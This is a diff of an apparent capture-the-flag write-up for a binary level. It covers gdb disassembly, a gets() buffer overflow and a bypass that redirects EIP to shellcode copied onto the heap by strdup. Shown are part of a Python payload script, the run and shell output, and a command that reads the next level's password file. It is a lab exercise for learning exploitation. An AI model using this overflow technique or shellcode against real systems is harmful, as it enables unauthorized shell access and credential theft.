@@ -1,23 +1,26 @@
-We found a binary in the home directory executed as level3.
-We can decompile it.
+$ ./level2
+=> (Wait for an input)
+$ dsahkjdhsf
+=> (Close standard input)
 
-Buffer address starts at 0xbffff6dc.
-Buffer address ends at 0xbffff728.
-EIP is saved at address 0x0bffff72c.
+I disas the <main>
+$ gdb level2
+$ (gdb) disas main
+there's only a call to the function <p> :
+   0x08048545 <+6>:	call   0x80484d4 <p>
+$ (gdb) disas p
+In this function, we can find multiple intresting things, as a <gets> 
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+a Comparison (which compare EAX to the address 0xb00000000)
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+and most importantly, a <strdup>
+   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
 
-We were able to inject shellcode inside the buffer but now we hit the condition.
-The condition `if ((unaff_retaddr & 0xb0000000) == 0xb0000000)` checks if we
-have overwritten the `EIP` register with an address starting with `0xb`. If it
-is the case, it prints the address and exit without restoring our overwritten
-`EIP`. So now we need to bypass this check.
+the <gets> is unprotected, so at first, we tried to overflow it with a shellcode but since the buffer is allocated in the stack, it's address starts with 0xb.
+Which is problematic because of the comparison and will cause an EXIT of the function.
 
-We tried to write our shellcode at an address after 0xbxxxxxx but our binary
-cannot access this memory area.
-
-After some research, we saw that our buffer is copied on heap through
-``strdup()`` function call.
-To bypass the check, we can point `EIP` register to our malloc'ed buffer instead
-of our stack buffer. It worked !
+But thanks to <strdup>, we have the possibility to store our Shellcode into the heap. So we have to point EIP to our malloc'ed buffer (Which is the returned value of <strdup> at the address : 0x0804a008) instead
+of our stack buffer to bypass the comparison with the address cause heap's address doesn't start with 0xb.
 
 ```python
 #! /usr/bin/env python
@@ -32,3 +35,14 @@ EIP = struct.pack("I", 0x0804a008)
 
 print SHELLCODE + PREFIX + "\x00\x00\x00\x00" + EBP + EIP + "\x00"
 ```
+
+The script above writes the payload we will give to our binary ./level2
+
+$ python script.py > /tmp/payload
+$ cat /tmp/payload | ./level2
+=> 1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+
+and we now have access to the shell that will allow us to get the flag :
+
+$ cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
